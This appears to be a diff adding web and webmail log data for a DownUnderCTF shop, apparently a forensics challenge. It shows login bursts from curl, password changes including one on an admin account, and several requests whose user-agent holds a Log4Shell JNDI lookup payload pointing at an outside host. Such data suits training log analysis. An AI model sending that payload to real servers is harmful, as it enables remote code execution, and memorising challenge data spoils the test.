+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:35.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:41.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:49.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/account",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:46.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/account",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/changepassword",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:18:11.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/changepassword",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/changepassword",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:18:12.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/changepassword",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login?ref=MmFjOWNiN2RjMDJiM2MwMDgzZWI3MDg5OGU1NDliNjM6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:18:13.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "test@shop.downunderctf.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Your shop.downunderctf.com Password Has Been Changed",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:18:14.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "test@shop.downunderctf.com",
+    "direction": "Incoming",
+    "outcome": "Delivered",
+    "subject": "Your shop.downunderctf.com Password Has Been Changed",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:25:42.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:42.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:43.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:43.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:44.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:45.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:45.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:46.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:48.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:49.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:13.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:28.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:30.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/account",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:34.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/account",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/changepassword",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:51.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/changepassword",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/changepassword",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:52.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/changepassword",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login?ref=M2RjOTE5ZGUxODZkMWE4ZWU2MmZmZjkyZDgwODM5Zjc6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:22.000+0000",
+    "origin": "121.208.54.156",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "${jndi:rmi://138.197.102.252:34129/index}",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:22.000+0000",
+    "origin": "121.208.54.156",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "${jndi:rmi://138.197.102.252:34129/index}",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:22.000+0000",
+    "origin": "121.208.54.156",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browser",
+    "useragent": "${jndi:rmi://138.197.102.252:34129/index}",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:22.000+0000",
+    "origin": "121.208.54.156",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "${jndi:rmi://138.197.102.252:34129/index}",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:22.000+0000",
+    "origin": "121.208.54.156",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=2",
+    "useragent": "${jndi:rmi://138.197.102.252:34129/index}",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:52.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "admin@shop.downunderctf.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Your shop.downunderctf.com Password Has Been Changed",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:39:23.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:39:24.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:39:25.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:39:25.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:02:50.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:03:49.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=3",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:04:55.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=9",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:39:26.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:39:27.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:39:59.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:40:07.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:40:16.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/account",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:40:28.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/account",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/changepassword",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:49:11.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=8",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:50:28.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:50:29.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:50:36.000+0000",
+    "origin": "101.186.67.24",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/orderconfirm",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.0)",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:29:42.000+0000",
+    "origin": "101.184.107.203",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "bing.com/search?q=downunderctf%20shop",
+    "useragent": "Opera/9.21 (X11; Linux i686; en-US) Presto/2.11.290 Version/11.00",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:30:32.000+0000",
+    "origin": "101.184.107.203",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Opera/9.21 (X11; Linux i686; en-US) Presto/2.11.290 Version/11.00",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:31:34.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "google.com/search?hl=en&q=shop.ductf",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:31:47.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:31:52.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:31:53.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:31:57.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=5",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:32:00.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=7",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:35:50.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:35:52.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:36:30.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:36:35.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:37:03.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/orderconfirm",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:37:10.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:37:44.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:19:02.000+0000",
+    "origin": "101.170.44.41",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 6.2; sl-SI; rv:1.9.1.20) Gecko/20140702 Firefox/35.0",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:19:11.000+0000",
+    "origin": "101.170.44.41",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 6.2; sl-SI; rv:1.9.1.20) Gecko/20140702 Firefox/35.0",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:51:21.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "ads.facebook.com",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:51:37.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:52:19.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:52:37.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=3",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:53:51.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=9",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:53:53.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=9",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:53:59.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:55:22.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:55:26.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:56:21.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:56:23.000+0000",
+    "origin": "1.44.27.180",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20220124 Firefox/36.0",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:07:26.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:07:42.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:07:49.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/product?id=6",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:08:29.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=6",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:08:33.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/product?id=7",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:12.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
